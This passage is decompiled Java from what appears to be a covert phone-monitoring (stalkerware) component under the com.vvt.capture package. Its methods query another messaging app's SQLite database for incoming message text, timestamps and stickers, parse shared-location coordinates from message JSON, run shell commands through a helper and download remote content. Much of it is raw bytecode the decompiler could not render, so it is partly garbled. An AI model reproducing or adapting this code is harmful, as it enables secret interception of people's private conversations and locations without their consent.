    }
    finally
    {
      if (localCursor == null) {
        break label127;
      }
      localCursor.close();
    }
    localCursor.close();
    label94:
    return i;
  }
  
  private static com.vvt.im.events.info.c d(String paramString)
  {
    int i = 1;
    boolean bool2 = false;
    String str1 = null;
    int j = a;
    if (j != 0) {}
    j = a;
    if (j != 0) {}
    com.vvt.im.events.info.c localc = new com/vvt/im/events/info/c;
    localc.<init>();
    String str2 = "%2C";
    String str3 = "markers=";
    String str4 = "&language=";
    for (;;)
    {
      try
      {
        JSONArray localJSONArray = new org/json/JSONArray;
        localJSONArray.<init>(paramString);
        if (localJSONArray == null) {
          continue;
        }
        j = i;
        int m = localJSONArray.length();
        if (m <= 0) {
          continue;
        }
        i &= j;
        if (i != 0)
        {
          i = 0;
          localObject = null;
          localObject = localJSONArray.get(0);
          localObject = (JSONObject)localObject;
          str1 = "name";
          bool2 = ((JSONObject)localObject).has(str1);
          if (bool2)
          {
            str1 = "name";
            str1 = ((JSONObject)localObject).getString(str1);
            localc.a(str1);
          }
          str1 = "media";
          bool2 = ((JSONObject)localObject).has(str1);
          if (bool2)
          {
            str1 = "media";
            localObject = ((JSONObject)localObject).getJSONArray(str1);
            bool2 = false;
            str1 = null;
            localObject = ((JSONArray)localObject).getJSONObject(0);
            str1 = "src";
            bool2 = ((JSONObject)localObject).has(str1);
            if (bool2)
            {
              str1 = "src";
              str1 = ((JSONObject)localObject).getString(str1);
              i = str1.indexOf(str3);
              k = str3.length() + i;
              i = str1.indexOf(str4);
              int n = -1;
              if (i == n) {
                i = str1.length();
              }
              localObject = str1.substring(k, i);
              localObject = ((String)localObject).split(str2);
              bool2 = false;
              str1 = null;
              str1 = localObject[0];
              double d1 = Double.parseDouble(str1);
              localc.a(d1);
              bool2 = true;
              localObject = localObject[bool2];
              double d2 = Double.parseDouble((String)localObject);
              localc.b(d2);
            }
          }
        }
      }
      catch (JSONException localJSONException)
      {
        Object localObject;
        int k;
        boolean bool1 = c;
        if (!bool1) {
          continue;
        }
        continue;
      }
      bool1 = a;
      if (bool1) {}
      return localc;
      k = 0;
      continue;
      bool1 = false;
      localObject = null;
    }
  }
  
  private static String e()
  {
    StringBuilder localStringBuilder = new java/lang/StringBuilder;
    localStringBuilder.<init>();
    localStringBuilder.append("SELECT ");
    localStringBuilder.append("msg_id AS id, ");
    localStringBuilder.append("text, ");
    localStringBuilder.append("timestamp_ms as time ");
    localStringBuilder.append("FROM messages ");
    localStringBuilder.append("where msg_type = 0 AND time > ? ");
    localStringBuilder.append("AND id NOT LIKE 'sent%' ");
    localStringBuilder.append("ORDER BY time DESC ");
    localStringBuilder.append("LIMIT ?");
    return localStringBuilder.toString();
  }
  
  /* Error */
  private static String e(SQLiteDatabase paramSQLiteDatabase, String paramString)
  {
    // Byte code:
    //   0: aconst_null
    //   1: astore_2
    //   2: getstatic 16	com/vvt/capture/removeFromPath/a/a:a	Z
    //   5: istore_3
    //   6: iload_3
    //   7: ifeq +3 -> 10
    //   10: aload_0
    //   11: ifnull +253 -> 264
    //   14: ldc_w 1180
    //   17: astore 4
    //   19: iconst_1
    //   20: istore 5
    //   22: iload 5
    //   24: anewarray 4	java/lang/Object
    //   27: astore 6
    //   29: iconst_0
    //   30: istore 7
    //   32: ldc_w 1310
    //   35: astore 8
    //   37: aload 6
    //   39: iconst_0
    //   40: aload 8
    //   42: aastore
    //   43: aload 4
    //   45: aload 6
    //   47: invokestatic 453	java/lang/String:format	(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
    //   50: astore 8
    //   52: iconst_1
    //   53: istore_3
    //   54: iload_3
    //   55: anewarray 26	java/lang/String
    //   58: astore 9
    //   60: iconst_0
    //   61: istore_3
    //   62: aconst_null
    //   63: astore 4
    //   65: aload 9
    //   67: iconst_0
    //   68: aload_1
    //   69: aastore
    //   70: ldc_w 1312
    //   73: astore 6
    //   75: iconst_0
    //   76: istore 7
    //   78: aload_0
    //   79: astore 4
    //   81: aload_0
    //   82: aload 6
    //   84: aconst_null
    //   85: aload 8
    //   87: aload 9
    //   89: aconst_null
    //   90: aconst_null
    //   91: aconst_null
    //   92: invokevirtual 195	android/database/sqlite/SQLiteDatabase:query	(Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;
    //   95: astore 6
    //   97: aload 6
    //   99: ifnull +157 -> 256
    //   102: aload 6
    //   104: invokeinterface 139 1 0
    //   109: istore_3
    //   110: iload_3
    //   111: ifeq +145 -> 256
    //   114: ldc_w 1314
    //   117: astore 4
    //   119: aload 6
    //   121: aload 4
    //   123: invokeinterface 82 2 0
    //   128: istore_3
    //   129: iconst_m1
    //   130: istore 7
    //   132: iload_3
    //   133: iload 7
    //   135: if_icmpeq +121 -> 256
    //   138: aload 6
    //   140: iload_3
    //   141: invokeinterface 85 2 0
    //   146: astore_2
    //   147: aload_2
    //   148: astore 4
    //   150: aload 6
    //   152: ifnull +10 -> 162
    //   155: aload 6
    //   157: invokeinterface 112 1 0
    //   162: getstatic 16	com/vvt/capture/removeFromPath/a/a:a	Z
    //   165: istore 5
    //   167: iload 5
    //   169: ifeq +3 -> 172
    //   172: aload 4
    //   174: areturn
    //   175: astore 4
    //   177: iconst_0
    //   178: istore_3
    //   179: aconst_null
    //   180: astore 4
    //   182: getstatic 23	com/vvt/capture/removeFromPath/a/a:MyUncaughtExceptionHandler	Z
    //   185: istore 5
    //   187: iload 5
    //   189: ifeq +3 -> 192
    //   192: aload 4
    //   194: ifnull +10 -> 204
    //   197: aload 4
    //   199: invokeinterface 112 1 0
    //   204: iconst_0
    //   205: istore_3
    //   206: aconst_null
    //   207: astore 4
    //   209: goto -47 -> 162
    //   212: astore 4
    //   214: aload_2
    //   215: ifnull +9 -> 224
    //   218: aload_2
    //   219: invokeinterface 112 1 0
    //   224: aload 4
    //   226: athrow
    //   227: astore 4
    //   229: aload 6
    //   231: astore_2
    //   232: goto -18 -> 214
    //   235: astore 6
    //   237: aload 4
    //   239: astore_2
    //   240: aload 6
    //   242: astore 4
    //   244: goto -30 -> 214
    //   247: astore 4
    //   249: aload 6
    //   251: astore 4
    //   253: goto -71 -> 182
    //   256: iconst_0
    //   257: istore_3
    //   258: aconst_null
    //   259: astore 4
    //   261: goto -111 -> 150
    //   264: iconst_0
    //   265: istore_3
    //   266: aconst_null
    //   267: astore 4
    //   269: goto -107 -> 162
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	272	0	paramSQLiteDatabase	SQLiteDatabase
    //   0	272	1	paramString	String
    //   1	239	2	localObject1	Object
    //   5	106	3	bool1	boolean
    //   128	138	3	i	int
    //   17	156	4	localObject2	Object
    //   175	1	4	localException1	Exception
    //   180	28	4	localObject3	Object
    //   212	13	4	localObject4	Object
    //   227	11	4	localObject5	Object
    //   242	1	4	localObject6	Object
    //   247	1	4	localException2	Exception
    //   251	17	4	localObject7	Object
    //   20	168	5	bool2	boolean
    //   27	203	6	localObject8	Object
    //   235	15	6	localObject9	Object
    //   30	106	7	j	int
    //   35	51	8	str	String
    //   58	30	9	arrayOfString	String[]
    // Exception table:
    //   from	to	target	type
    //   22	27	175	java/lang/Exception
    //   40	43	175	java/lang/Exception
    //   45	50	175	java/lang/Exception
    //   54	58	175	java/lang/Exception
    //   68	70	175	java/lang/Exception
    //   91	95	175	java/lang/Exception
    //   22	27	212	finally
    //   40	43	212	finally
    //   45	50	212	finally
    //   54	58	212	finally
    //   68	70	212	finally
    //   91	95	212	finally
    //   102	109	227	finally
    //   121	128	227	finally
    //   140	146	227	finally
    //   182	185	235	finally
    //   102	109	247	java/lang/Exception
    //   121	128	247	java/lang/Exception
    //   140	146	247	java/lang/Exception
  }
  
  private static String e(String paramString)
  {
    int i = 0;
    String str = null;
    if (paramString != null)
    {
      int j = paramString.length();
      if (j > 0)
      {
        i = paramString.lastIndexOf("/") + 1;
        str = paramString.substring(i);
      }
    }
    return str;
  }
  
  private static String f()
  {
    StringBuilder localStringBuilder = new java/lang/StringBuilder;
    localStringBuilder.<init>();
    localStringBuilder.append("SELECT ");
    localStringBuilder.append("msg_id AS id, ");
    localStringBuilder.append("is_non_authoritative ");
    localStringBuilder.append("FROM messages ");
    localStringBuilder.append("where id = ? ");
    return localStringBuilder.toString();
  }
  
  /* Error */
  private static String f(SQLiteDatabase paramSQLiteDatabase, String paramString)
  {
    // Byte code:
    //   0: aconst_null
    //   1: astore_2
    //   2: getstatic 16	com/vvt/capture/removeFromPath/a/a:a	Z
    //   5: istore_3
    //   6: iload_3
    //   7: ifeq +3 -> 10
    //   10: ldc_w 338
    //   13: astore 4
    //   15: aload_0
    //   16: ifnull +300 -> 316
    //   19: new 168	java/lang/StringBuilder
    //   22: astore 5
    //   24: aload 5
    //   26: invokespecial 169	java/lang/StringBuilder:<init>	()V
    //   29: ldc_w 274
    //   32: astore 6
    //   34: aload 5
    //   36: aload 6
    //   38: invokevirtual 173	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   41: pop
    //   42: ldc_w 1318
    //   45: astore 6
    //   47: aload 5
    //   49: aload 6
    //   51: invokevirtual 173	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   54: pop
    //   55: iconst_1
    //   56: istore 7
    //   58: iload 7
    //   60: anewarray 26	java/lang/String
    //   63: astore 8
    //   65: iconst_0
    //   66: istore 7
    //   68: aconst_null
    //   69: astore 6
    //   71: new 168	java/lang/StringBuilder
    //   74: astore 9
    //   76: aload 9
    //   78: invokespecial 169	java/lang/StringBuilder:<init>	()V
    //   81: ldc_w 1320
    //   84: astore 10
    //   86: aload 9
    //   88: aload 10
    //   90: invokevirtual 173	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   93: astore 9
    //   95: aload_1
    //   96: invokevirtual 607	java/lang/String:trim	()Ljava/lang/String;
    //   99: astore 10
    //   101: aload 9
    //   103: aload 10
    //   105: invokevirtual 173	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   108: astore 9
    //   110: aload 9
    //   112: invokevirtual 181	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   115: astore 9
    //   117: aload 8
    //   119: iconst_0
    //   120: aload 9
    //   122: aastore
    //   123: ldc_w 1182
    //   126: astore 6
    //   128: aconst_null
    //   129: astore 9
    //   131: aload 5
    //   133: invokevirtual 181	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   136: astore 10
    //   138: aload_0
    //   139: astore 5
    //   141: aload_0
    //   142: aload 6
    //   144: aconst_null
    //   145: aload 10
    //   147: aload 8
    //   149: aconst_null
    //   150: aconst_null
    //   151: aconst_null
    //   152: invokevirtual 195	android/database/sqlite/SQLiteDatabase:query	(Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;
    //   155: astore 6
    //   157: aload 6
    //   159: ifnull +150 -> 309
    //   162: aload 6
    //   164: invokeinterface 139 1 0
    //   169: pop
    //   170: ldc -35
    //   172: astore 5
    //   174: aload 6
    //   176: aload 5
    //   178: invokeinterface 82 2 0
    //   183: istore_3
    //   184: aload 6
    //   186: iload_3
    //   187: invokeinterface 85 2 0
    //   192: astore 5
    //   194: aload 6
    //   196: ifnull +10 -> 206
    //   199: aload 6
    //   201: invokeinterface 112 1 0
    //   206: getstatic 16	com/vvt/capture/removeFromPath/a/a:a	Z
    //   209: istore 7
    //   211: iload 7
    //   213: ifeq +3 -> 216
    //   216: getstatic 16	com/vvt/capture/removeFromPath/a/a:a	Z
    //   219: istore 7
    //   221: iload 7
    //   223: ifeq +3 -> 226
    //   226: aload 5
    //   228: areturn
    //   229: astore 5
    //   231: iconst_0
    //   232: istore_3
    //   233: aconst_null
    //   234: astore 5
    //   236: getstatic 23	com/vvt/capture/removeFromPath/a/a:MyUncaughtExceptionHandler	Z
    //   239: istore 7
    //   241: iload 7
    //   243: ifeq +3 -> 246
    //   246: aload 5
    //   248: ifnull +10 -> 258
    //   251: aload 5
    //   253: invokeinterface 112 1 0
    //   258: aload 4
    //   260: astore 5
    //   262: goto -56 -> 206
    //   265: astore 5
    //   267: aload_2
    //   268: ifnull +9 -> 277
    //   271: aload_2
    //   272: invokeinterface 112 1 0
    //   277: aload 5
    //   279: athrow
    //   280: astore 5
    //   282: aload 6
    //   284: astore_2
    //   285: goto -18 -> 267
    //   288: astore 6
    //   290: aload 5
    //   292: astore_2
    //   293: aload 6
    //   295: astore 5
    //   297: goto -30 -> 267
    //   300: astore 5
    //   302: aload 6
    //   304: astore 5
    //   306: goto -70 -> 236
    //   309: aload 4
    //   311: astore 5
    //   313: goto -119 -> 194
    //   316: aload 4
    //   318: astore 5
    //   320: goto -114 -> 206
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	323	0	paramSQLiteDatabase	SQLiteDatabase
    //   0	323	1	paramString	String
    //   1	292	2	localObject1	Object
    //   5	2	3	bool1	boolean
    //   183	50	3	i	int
    //   13	304	4	str1	String
    //   22	205	5	localObject2	Object
    //   229	1	5	localException1	Exception
    //   234	27	5	str2	String
    //   265	13	5	localObject3	Object
    //   280	11	5	localObject4	Object
    //   295	1	5	localObject5	Object
    //   300	1	5	localException2	Exception
    //   304	15	5	localObject6	Object
    //   32	251	6	localObject7	Object
    //   288	15	6	localObject8	Object
    //   56	186	7	bool2	boolean
    //   63	85	8	arrayOfString	String[]
    //   74	56	9	localObject9	Object
    //   84	62	10	str3	String
    // Exception table:
    //   from	to	target	type
    //   19	22	229	java/lang/Exception
    //   24	29	229	java/lang/Exception
    //   36	42	229	java/lang/Exception
    //   49	55	229	java/lang/Exception
    //   58	63	229	java/lang/Exception
    //   71	74	229	java/lang/Exception
    //   76	81	229	java/lang/Exception
    //   88	93	229	java/lang/Exception
    //   95	99	229	java/lang/Exception
    //   103	108	229	java/lang/Exception
    //   110	115	229	java/lang/Exception
    //   120	123	229	java/lang/Exception
    //   131	136	229	java/lang/Exception
    //   151	155	229	java/lang/Exception
    //   19	22	265	finally
    //   24	29	265	finally
    //   36	42	265	finally
    //   49	55	265	finally
    //   58	63	265	finally
    //   71	74	265	finally
    //   76	81	265	finally
    //   88	93	265	finally
    //   95	99	265	finally
    //   103	108	265	finally
    //   110	115	265	finally
    //   120	123	265	finally
    //   131	136	265	finally
    //   151	155	265	finally
    //   162	170	280	finally
    //   176	183	280	finally
    //   186	192	280	finally
    //   236	239	288	finally
    //   162	170	300	java/lang/Exception
    //   176	183	300	java/lang/Exception
    //   186	192	300	java/lang/Exception
  }
  
  /* Error */
  private static List f(String paramString)
  {
    // Byte code:
    //   0: aconst_null
    //   1: astore_1
    //   2: iconst_1
    //   3: istore_2
    //   4: new 555	java/util/ArrayList
    //   7: astore_3
    //   8: aload_3
    //   9: invokespecial 556	java/util/ArrayList:<init>	()V
    //   12: getstatic 16	com/vvt/capture/removeFromPath/a/a:a	Z
    //   15: istore 4
    //   17: iload 4
    //   19: ifeq +3 -> 22
    //   22: invokestatic 1216	com/vvt/shell/f:removeFromPath	()Lcom/vvt/shell/f;
    //   25: astore 5
    //   27: ldc_w 1322
    //   30: astore 6
    //   32: iconst_2
    //   33: istore 7
    //   35: iload 7
    //   37: anewarray 4	java/lang/Object
    //   40: astore 8
    //   42: iconst_0
    //   43: istore 9
    //   45: aconst_null
    //   46: astore 10
    //   48: ldc_w 1324
    //   51: astore 11
    //   53: aload 8
    //   55: iconst_0
    //   56: aload 11
    //   58: aastore
    //   59: iconst_1
    //   60: istore 9
    //   62: aload 8
    //   64: iload 9
    //   66: aload_0
    //   67: aastore
    //   68: aload 6
    //   70: aload 8
    //   72: invokestatic 453	java/lang/String:format	(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
    //   75: astore 6
    //   77: aload 5
    //   79: aload 6
    //   81: invokevirtual 1219	com/vvt/shell/f:a	(Ljava/lang/String;)Ljava/lang/String;
    //   84: astore 8
    //   86: new 520	java/io/BufferedReader
    //   89: astore 6
    //   91: new 1326	java/io/StringReader
    //   94: astore 10
    //   96: aload 10
    //   98: aload 8
    //   100: invokespecial 1327	java/io/StringReader:<init>	(Ljava/lang/String;)V
    //   103: aload 6
    //   105: aload 10
    //   107: invokespecial 523	java/io/BufferedReader:<init>	(Ljava/io/Reader;)V
    //   110: aload 6
    //   112: invokevirtual 1330	java/io/BufferedReader:readLine	()Ljava/lang/String;
    //   115: astore_1
    //   116: aload_1
    //   117: ifnull +133 -> 250
    //   120: aload_1
    //   121: invokestatic 1335	com/vvt/io/removeFromPath:a	(Ljava/lang/String;)Lcom/vvt/io/MyUncaughtExceptionHandler;
    //   124: astore_1
    //   125: aload_1
    //   126: ifnull -16 -> 110
    //   129: aload_1
    //   130: aload_0
    //   131: putfield 499	com/vvt/io/MyUncaughtExceptionHandler:a	Ljava/lang/String;
    //   134: aload_1
    //   135: getfield 1338	com/vvt/io/MyUncaughtExceptionHandler:j	I
    //   138: istore 7
    //   140: iload 7
    //   142: ifne +43 -> 185
    //   145: aload_3
    //   146: aload_1
    //   147: invokeinterface 565 2 0
    //   152: pop
    //   153: goto -43 -> 110
    //   156: astore_1
    //   157: aload 5
    //   159: astore_1
    //   160: getstatic 23	com/vvt/capture/removeFromPath/a/a:MyUncaughtExceptionHandler	Z
    //   163: istore 12
    //   165: iload 12
    //   167: ifeq +3 -> 170
    //   170: aload 6
    //   172: invokestatic 1341	com/vvt/io/d:a	(Ljava/io/BufferedReader;)V
    //   175: aload_1
    //   176: ifnull +7 -> 183
    //   179: aload_1
    //   180: invokevirtual 1225	com/vvt/shell/f:d	()V
    //   183: aload_3
    //   184: areturn
    //   185: aload_1
    //   186: getfield 1338	com/vvt/io/MyUncaughtExceptionHandler:j	I
    //   189: istore 7
    //   191: iload 7
    //   193: iload_2
    //   194: if_icmpne -84 -> 110
    //   197: aload_1
    //   198: getfield 487	com/vvt/io/MyUncaughtExceptionHandler:removeFromPath	Ljava/lang/String;
    //   201: astore_1
    //   202: aload_0
    //   203: aload_1
    //   204: invokestatic 504	com/vvt/io/p:a	(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    //   207: astore_1
    //   208: aload_1
    //   209: invokestatic 469	com/vvt/capture/removeFromPath/a/a:f	(Ljava/lang/String;)Ljava/util/List;
    //   212: astore_1
    //   213: aload_3
    //   214: aload_1
    //   215: invokeinterface 782 2 0
    //   220: pop
    //   221: goto -111 -> 110
    //   224: astore 13
    //   226: aload 6
    //   228: astore_1
    //   229: aload 13
    //   231: astore 6
    //   233: aload_1
    //   234: invokestatic 1341	com/vvt/io/d:a	(Ljava/io/BufferedReader;)V
    //   237: aload 5
    //   239: ifnull +8 -> 247
    //   242: aload 5
    //   244: invokevirtual 1225	com/vvt/shell/f:d	()V
    //   247: aload 6
    //   249: athrow
    //   250: aload 6
    //   252: invokestatic 1341	com/vvt/io/d:a	(Ljava/io/BufferedReader;)V
    //   255: aload 5
    //   257: ifnull -74 -> 183
    //   260: aload 5
    //   262: invokevirtual 1225	com/vvt/shell/f:d	()V
    //   265: goto -82 -> 183
    //   268: astore 6
    //   270: iconst_0
    //   271: istore 12
    //   273: aconst_null
    //   274: astore 5
    //   276: goto -43 -> 233
    //   279: astore 6
    //   281: goto -48 -> 233
    //   284: astore 13
    //   286: aload_1
    //   287: astore 5
    //   289: aload 6
    //   291: astore_1
    //   292: aload 13
    //   294: astore 6
    //   296: goto -63 -> 233
    //   299: astore 6
    //   301: iconst_0
    //   302: istore 4
    //   304: aconst_null
    //   305: astore 6
    //   307: goto -147 -> 160
    //   310: astore 6
    //   312: iconst_0
    //   313: istore 4
    //   315: aconst_null
    //   316: astore 6
    //   318: aload 5
    //   320: astore_1
    //   321: goto -161 -> 160
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	324	0	paramString	String
    //   1	146	1	localObject1	Object
    //   156	1	1	localException1	Exception
    //   159	162	1	localObject2	Object
    //   3	192	2	i	int
    //   7	207	3	localArrayList	ArrayList
    //   15	299	4	bool1	boolean
    //   25	294	5	localObject3	Object
    //   30	221	6	localObject4	Object
    //   268	1	6	localObject5	Object
    //   279	11	6	localObject6	Object
    //   294	1	6	localObject7	Object
    //   299	1	6	localException2	Exception
    //   305	1	6	localObject8	Object
    //   310	1	6	localException3	Exception
    //   316	1	6	localObject9	Object
    //   33	162	7	j	int
    //   40	59	8	localObject10	Object
    //   43	22	9	k	int
    //   46	60	10	localStringReader	java.io.StringReader
    //   51	6	11	str	String
    //   163	109	12	bool2	boolean
    //   224	6	13	localObject11	Object
    //   284	9	13	localObject12	Object
    // Exception table:
    //   from	to	target	type
    //   110	115	156	java/lang/Exception
    //   120	124	156	java/lang/Exception
    //   130	134	156	java/lang/Exception
    //   134	138	156	java/lang/Exception
    //   146	153	156	java/lang/Exception
    //   185	189	156	java/lang/Exception
    //   197	201	156	java/lang/Exception
    //   203	207	156	java/lang/Exception
    //   208	212	156	java/lang/Exception
    //   214	221	156	java/lang/Exception
    //   110	115	224	finally
    //   120	124	224	finally
    //   130	134	224	finally
    //   134	138	224	finally
    //   146	153	224	finally
    //   185	189	224	finally
    //   197	201	224	finally
    //   203	207	224	finally
    //   208	212	224	finally
    //   214	221	224	finally
    //   22	25	268	finally
    //   35	40	279	finally
    //   56	59	279	finally
    //   66	68	279	finally
    //   70	75	279	finally
    //   79	84	279	finally
    //   86	89	279	finally
    //   91	94	279	finally
    //   98	103	279	finally
    //   105	110	279	finally
    //   160	163	284	finally
    //   22	25	299	java/lang/Exception
    //   35	40	310	java/lang/Exception
    //   56	59	310	java/lang/Exception
    //   66	68	310	java/lang/Exception
    //   70	75	310	java/lang/Exception
    //   79	84	310	java/lang/Exception
    //   86	89	310	java/lang/Exception
    //   91	94	310	java/lang/Exception
    //   98	103	310	java/lang/Exception
    //   105	110	310	java/lang/Exception
  }
  
  private static String g()
  {
    StringBuilder localStringBuilder = new java/lang/StringBuilder;
    localStringBuilder.<init>();
    localStringBuilder.append("SELECT ");
    localStringBuilder.append("uri ");
    localStringBuilder.append("FROM stickers ");
    localStringBuilder.append("where id = ? ");
    return localStringBuilder.toString();
  }
  
  /* Error */
  private static byte[] g(String paramString)
  {
    // Byte code:
    //   0: iconst_0
    //   1: istore_1
    //   2: aconst_null
    //   3: astore_2
    //   4: aconst_null
    //   5: astore_3
    //   6: getstatic 16	com/vvt/capture/removeFromPath/a/a:a	Z
    //   9: istore 4
    //   11: iload 4
    //   13: ifeq +3 -> 16
    //   16: iconst_0
    //   17: newarray <illegal type>
    //   19: astore 5
    //   21: aload_0
    //   22: ifnull +99 -> 121
    //   25: new 1277	java/net/URL
    //   28: astore_3
    //   29: aload_3
    //   30: aload_0
    //   31: invokespecial 1278	java/net/URL:<init>	(Ljava/lang/String;)V
    //   34: aload_3
    //   35: invokevirtual 1349	java/net/URL:openStream	()Ljava/io/InputStream;
    //   38: astore_3
    //   39: new 1351	java/io/ByteArrayOutputStream
    //   42: astore 6
    //   44: aload 6
    //   46: invokespecial 1352	java/io/ByteArrayOutputStream:<init>	()V
    //   49: sipush 2048
    //   52: istore_1
    //   53: iload_1
    //   54: newarray <illegal type>
    //   56: astore_2
    //   57: aload_3
    //   58: aload_2
    //   59: invokevirtual 1358	java/io/InputStream:read	([B)I
    //   62: istore 7
    //   64: iconst_m1
    //   65: istore 8
    //   67: iload 7
    //   69: iload 8
    //   71: if_icmpeq +53 -> 124
    //   74: iconst_0
    //   75: istore 8
    //   77: aload 6
    //   79: aload_2
    //   80: iconst_0
    //   81: iload 7
    //   83: invokevirtual 1362	java/io/ByteArrayOutputStream:write	([BII)V
    //   86: goto -29 -> 57
    //   89: astore_2
    //   90: aload 6
    //   92: astore_2
    //   93: getstatic 23	com/vvt/capture/removeFromPath/a/a:MyUncaughtExceptionHandler	Z
    //   96: istore 9
    //   98: iload 9
    //   100: ifeq +3 -> 103
    //   103: getstatic 23	com/vvt/capture/removeFromPath/a/a:MyUncaughtExceptionHandler	Z
    //   106: istore 9
    //   108: iload 9
    //   110: ifeq +3 -> 113
    //   113: aload_2
    //   114: invokestatic 1365	com/vvt/io/d:a	(Ljava/io/OutputStream;)V
    //   117: aload_3
    //   118: invokestatic 1368	com/vvt/io/d:a	(Ljava/io/InputStream;)V
    //   121: aload 5
    //   123: areturn
    //   124: aload 6
    //   126: invokevirtual 1371	java/io/ByteArrayOutputStream:toByteArray	()[B
    //   129: astore 5
    //   131: getstatic 16	com/vvt/capture/removeFromPath/a/a:a	Z
    //   134: istore_1
    //   135: iload_1
    //   136: ifeq +3 -> 139
    //   139: aload 6
    //   141: invokestatic 1365	com/vvt/io/d:a	(Ljava/io/OutputStream;)V
    //   144: goto -27 -> 117
    //   147: astore 5
    //   149: aconst_null
    //   150: astore_3
    //   151: aload_2
    //   152: invokestatic 1365	com/vvt/io/d:a	(Ljava/io/OutputStream;)V
    //   155: aload_3
    //   156: invokestatic 1368	com/vvt/io/d:a	(Ljava/io/InputStream;)V
    //   159: aload 5
    //   161: athrow
    //   162: astore 5
    //   164: goto -13 -> 151
    //   167: astore 5
    //   169: aload 6
    //   171: astore_2
    //   172: goto -21 -> 151
    //   175: astore_3
    //   176: aconst_null
    //   177: astore_3
    //   178: goto -85 -> 93
    //   181: astore 6
    //   183: goto -90 -> 93
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	186	0	paramString	String
    //   1	53	1	i	int
    //   134	2	1	bool1	boolean
    //   3	77	2	arrayOfByte1	byte[]
    //   89	1	2	localException1	Exception
    //   92	80	2	localObject1	Object
    //   5	151	3	localObject2	Object
    //   175	1	3	localException2	Exception
    //   177	1	3	localObject3	Object
    //   9	3	4	bool2	boolean
    //   19	111	5	arrayOfByte2	byte[]
    //   147	13	5	localObject4	Object
    //   162	1	5	localObject5	Object
    //   167	1	5	localObject6	Object
    //   42	128	6	localByteArrayOutputStream	java.io.ByteArrayOutputStream
    //   181	1	6	localException3	Exception
    //   62	20	7	j	int
    //   65	11	8	k	int
    //   96	13	9	bool3	boolean
    // Exception table:
    //   from	to	target	type
    //   53	56	89	java/lang/Exception
    //   58	62	89	java/lang/Exception
    //   81	86	89	java/lang/Exception
    //   124	129	89	java/lang/Exception
    //   131	134	89	java/lang/Exception
    //   25	28	147	finally
    //   30	34	147	finally
    //   34	38	147	finally
    //   39	42	162	finally
    //   44	49	162	finally
    //   93	96	162	finally
    //   103	106	162	finally
    //   53	56	167	finally
    //   58	62	167	finally
    //   81	86	167	finally
    //   124	129	167	finally
    //   131	134	167	finally
    //   25	28	175	java/lang/Exception
    //   30	34	175	java/lang/Exception
    //   34	38	175	java/lang/Exception
    //   39	42	181	java/lang/Exception
    //   44	49	181	java/lang/Exception
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/removeFromPath/a/a.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */